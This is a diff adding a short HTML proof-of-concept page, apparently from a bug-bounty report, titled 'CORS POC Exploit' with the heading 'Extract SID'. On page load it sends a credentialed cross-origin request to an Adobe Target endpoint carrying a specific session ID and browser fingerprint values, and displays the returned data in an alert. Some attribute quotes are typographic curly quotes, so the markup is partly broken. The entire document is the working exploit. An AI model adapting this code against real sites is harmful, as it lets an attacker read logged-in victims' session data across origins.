@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById(“demo”).innerHTML = alert(this.responseText);
+}
+};
+xhttp.open(“GET”, “https://adobe.tt.omtrdc.net/m2/adobe/mbox/json?mbox=adobe-global-mbox&mboxSession=26591c2effde4f00b41ef11a4cf57007&mboxPC=&mboxPage=b34e6ecf0b274bb3964788d4903af38b&mboxRid=2ba67e882bb14ea3bba427f47b0bf3e0&mboxVersion=1.5.0&mboxCount=1&mboxTime=1552301585869&mboxHost=forums.adobe.com&mboxURL=https%3A%2F%2Fforums.adobe.com%2Fwelcome&mboxReferrer=&mboxXDomain=enabled&browserHeight=509&browserWidth=1229&browserTimeOffset=-240&screenHeight=768&screenWidth=1366&colorDepth=24&devicePixelRatio=1&screenOrientation=landscape&webGLRenderer=Mesa%20DRI%20Intel(R)%20UHD%20Graphics%20620%20(Kabylake%20GT2)%20&at_property=&evidon_cookie=null&mar_alias=&mar_aud=&mar_ind=&mboxMCSDID=115170C826D78A17-39FD99FAF7F59EA0&vst.trk=stats.adobe.com&vst.trks=sstats.adobe.com", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}</script></head>
+<body onload=”cors()”>
+<center>
+<h2>CORS POC Exploit armaan </h2>
+<h3>Extract SID</h3><div id=”demo”>
+<button type=”button” onclick=”cors()”>Exploit</button></div></body></html>
